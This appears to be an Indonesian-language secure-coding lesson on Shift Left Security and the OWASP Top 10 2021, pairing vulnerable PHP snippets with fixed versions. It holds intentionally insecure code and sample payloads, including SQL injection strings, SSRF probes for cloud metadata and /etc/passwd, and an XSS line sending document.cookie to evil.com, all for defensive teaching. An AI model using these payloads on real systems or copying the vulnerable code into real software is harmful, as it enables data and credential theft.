Shift Left Security

OWASP adalah yayasan nirlaba global penyedia panduan keamanan open-source.
OWASP Top 10 mewakili 10 risiko kerentanan paling kritis bagi web developer.

Shift Left Security adalah pendekatan yang menggeser pengujian keamanan ke tahap paling awal dalam Software Development Life Cycle (SDLC) — atau "ke kiri" jika divisualisasikan dalam garis waktu pengembangan.

Secara tradisional, penetration testing dilakukan di akhir siklus. Dengan Shift Left, pemeriksaan dilakukan sejak awal melalui code review, pemindaian statis, dan otomatisasi. Tujuannya menambal celah saat biaya perbaikannya masih sangat murah.

Materi: From Code to Zero

Mengisyaratkan perjalanan dari penulisan kode sumber hingga kondisi infrastruktur Zero Trust.

💻
1. The Code: Membangun Fondasi
  • Mindset Shift Left: Menemukan bug di tahap text editor jauh lebih murah dibanding saat rilis.
  • Secure Coding Practices: Praktik menulis kode kebal sejak awal (misal: sanitasi, prepared statements).
  • SAST: Penggunaan otomatisasi (SonarQube/PHPStan) untuk menyoroti rentan sebelum dieksekusi.
🐛
2. The Vulnerabilities: Membedah OWASP
  • Broken Access Control: Manipulasi parameter URL (IDOR) untuk mengakses profil orang lain.
  • Injection & XSS: Input berbahaya yang sukses membajak database atau eksekusi script browser.
  • Misconfiguration: Bahaya debug mode aktif dan tereksposnya file .env di production.

Materi: From Code to Zero

⚙️
3. The Pipeline: DevSecOps
  • SCA (Software Composition Analysis): Memindai CVE pada package pihak ketiga (NPM/Composer).
  • CI/CD Security: Otomatis menolak pull request jika kode mengandung celah lewat GitHub Actions.
🛡️
4. The Zero: Menuju Zero Trust
  • Container Security: Praktik aman di Docker (hindari akses root, pindai dengan Trivy).
  • Zero Trust Architecture: Never trust, always verify. Jangan menganggap jaringan internal otomatis aman (Least Privilege).
🔴 A01:2021 — Critical

Broken Access Control

User bisa mengakses data atau melakukan aksi di luar izin yang seharusnya. Naik dari posisi #5 ke #1 di OWASP 2021.

⚠️ RENTAN — vuln.php
// IDOR — user bisa akses data user lain $user_id = $_GET['id']; $query = "SELECT * FROM users WHERE id = $user_id"; // Ubah ?id=1 → lihat data admin!
✅ AMAN — secure.php
// Cek otorisasi + prepared statement if ($requested_id !== $_SESSION['user_id']) { http_response_code(403); die("Akses ditolak"); } $stmt = $conn->prepare("... WHERE id = ?");
IDOR Privilege Escalation Missing Authorization
🟡 A02:2021 — Critical

Cryptographic Failures

Data sensitif tidak terlindungi dengan kriptografi yang kuat — password plaintext, hash lemah (MD5), data tanpa enkripsi.

⚠️ RENTAN
// Password plaintext & MD5 $pass = "rahasia123"; $hash = md5($pass); // MD5 bisa di-crack dalam hitungan detik! // Data sensitif tanpa enkripsi: $ktp = "3275012345678901";
✅ AMAN
// Bcrypt + AES-256-GCM $hash = password_hash( $pass, PASSWORD_BCRYPT, ['cost'=>12] ); // Enkripsi data sensitif: $enc = openssl_encrypt( $ktp, 'aes-256-gcm', $key, ... );
🔴 A03:2021 — Critical

SQL Injection

Input user dimasukkan langsung ke query SQL — penyerang bisa membaca, mengubah, atau menghapus seluruh database.

⚠️ RENTAN
// Input langsung ke query! $search = $_GET['search']; $query = "SELECT * FROM products WHERE name LIKE '%$search%'"; // Coba: ' OR '1'='1 // Coba: ' UNION SELECT password // FROM users-- -
✅ AMAN — Prepared Statement
// Parameter terpisah dari query $stmt = $conn->prepare( "SELECT * FROM products WHERE name LIKE ?" ); $stmt->bind_param("s", $search); $stmt->execute(); // Input tidak bisa mengubah struktur SQL!
🔵 A04:2021 — High

Insecure Design

Kelemahan di level arsitektur/desain — bukan bug kode, tapi desain yang tidak memikirkan keamanan.

⚠️ RENTAN — No Rate Limit
// Reset password tanpa batasan if ($answer === $security_answer) { // ⚠️ Langsung tampilkan password! echo $user['password']; } // ⚠️ Tidak ada rate limiting // ⚠️ Security question mudah ditebak // ⚠️ Tidak ada account lockout
✅ AMAN — Secure by Design
// Rate limiting + token reset if ($attempts > MAX_ATTEMPTS) { $lockout = time() + 900; log_security_event('lockout'); } // ✅ Kirim reset link via email $token = bin2hex(random_bytes(32)); sendResetEmail($email, $token);
🟡 A05:2021 — High

Security Misconfiguration

Debug mode aktif di production, default credentials, phpinfo() terbuka, security headers tidak di-set.

❌ Yang Salah
  • display_errors = On di production
  • DB user: root, password: (kosong)
  • phpinfo() bisa diakses publik
  • Tidak ada security headers
  • Default admin credentials aktif
✅ Best Practice
  • display_errors = Off, log_errors = On
  • DB credentials dari env variable
  • Hapus file default (readme, installer)
  • Set CSP, HSTS, X-Frame-Options
  • Ganti semua default credentials
🟡 A06:2021 — High

Vulnerable Components

Menggunakan library, framework, atau runtime yang usang dan memiliki CVE (kerentanan yang dipublikasi).

📦 Contoh CVE Berbahaya
  • PHPMailer 5.2.21 → RCE (CVE-2016-10033)
  • jQuery < 3.5.0 → XSS (CVE-2020-11022)
  • Log4j → RCE (CVE-2021-44228) 💥
  • PHP < 8.1 → End of Life, no patches
🔍 Pencegahan
  • Jalankan composer audit / npm audit
  • Gunakan Dependabot / Snyk di CI/CD
  • SRI (Subresource Integrity) untuk CDN
  • Update ke versi yang masih di-support
🔴 A07:2021 — Critical

Authentication Failures

Session management lemah, brute-force tanpa batas, password lemah, tidak ada MFA.

⚠️ RENTAN
// Login tanpa proteksi if ($pass === "admin123") { $_SESSION['user'] = $username; // ⚠️ Session ID tidak di-regenerate // ⚠️ Tidak ada rate limiting // ⚠️ User enumeration }
✅ AMAN
// Bcrypt + session regeneration if (password_verify($pass, $hash)) { session_regenerate_id(true); $_SESSION['login_time'] = time(); // ✅ Rate limit: max 5 attempts // ✅ Lockout: 15 min cooldown // ✅ Generic error message }
🟡 A08:2021 — High

Data Integrity Failures

Insecure deserialization, cookie tanpa signature, software update tanpa verifikasi checksum.

⚠️ RENTAN
// Insecure deserialization → RCE! $data = unserialize($_COOKIE['prefs']); // __wakeup() / __destruct() dieksekusi! // Cookie tanpa verifikasi: $role = $_COOKIE['role']; // Ubah role=user → role=admin!
✅ AMAN
// Gunakan JSON + HMAC $data = json_decode($input, true); // Cookie dengan signature: $sig = hash_hmac('sha256', $data, $key); if (!hash_equals($expected, $sig)) { die("Tampering terdeteksi!"); }
🔵 A09:2021 — High

Logging & Monitoring Failures

Tanpa logging yang baik, breach baru terdeteksi setelah rata-rata 277 hari (IBM Security Report).

🔇 Yang HARUS Di-log
  • Login berhasil & gagal (siapa, kapan, dari mana)
  • Perubahan role/privilege
  • Akses data sensitif
  • Error dan exception
  • Percobaan SQL Injection / XSS
🔔 Alert Rules
  • 🚨 10+ login gagal dalam 5 menit
  • 🚨 SQL Injection pattern terdeteksi
  • ⚠️ Login dari IP/negara baru
  • ⚠️ Admin baru ditambahkan
  • ℹ️ Data massal di-export
🟡 A10:2021 — High

SSRF — Server-Side Request Forgery

Penyerang membuat server melakukan request ke resource internal — bypass firewall, baca metadata cloud.

⚠️ RENTAN
// Server fetch URL apa pun dari user $url = $_POST['url']; $content = file_get_contents($url); // Coba: http://169.254.169.254/ // → Baca AWS IAM credentials! // Coba: file:///etc/passwd // → Baca file lokal server!
✅ AMAN
// Whitelist + IP validation $allowed = ['example.com']; $parsed = parse_url($url); if (!in_array($parsed['host'], $allowed)) die("Domain tidak diizinkan"); // ✅ Block internal IPs (RFC 1918) // ✅ Only allow HTTP/HTTPS protocol // ✅ No redirect following
🟣 BONUS — XSS

Cross-Site Scripting (XSS)

Script berbahaya diinjeksikan ke halaman web — bisa mencuri cookie, session, atau memasang keylogger.

⚠️ RENTAN — Reflected & Stored
// Reflected: input langsung di-echo echo "Hasil: " . $_GET['q']; // Stored: komentar dari DB tanpa encode echo $row['comment']; // Payload: <script> // fetch('http://evil.com?c=' // +document.cookie)</script>
✅ AMAN — Output Encoding + CSP
// Encode semua output echo htmlspecialchars( $input, ENT_QUOTES, 'UTF-8' ); // Content-Security-Policy header: header("Content-Security-Policy: default-src 'self'; script-src 'self';"); // Browser MENOLAK inline script!

🛡️ Secure Coding Best Practices

🔐
Defense in Depth

Jangan bergantung pada satu lapisan keamanan. Terapkan validasi di setiap layer.

🚫
Never Trust Input

Validasi dan sanitasi SEMUA input — dari user, API, file, database, bahkan internal.

📝
Log Everything

Log semua aktivitas keamanan. Tanpa logging, breach tidak bisa dideteksi.

⬅️
Shift Left Security

Integrasikan security sejak awal SDLC, bukan di akhir deployment.

🔄
Keep Updated

Update dependency secara rutin. Audit CVE setiap minggu di CI/CD pipeline.

🧪
Test Security

SAST, DAST, pentest rutin. Gunakan OWASP ZAP atau Burp Suite.
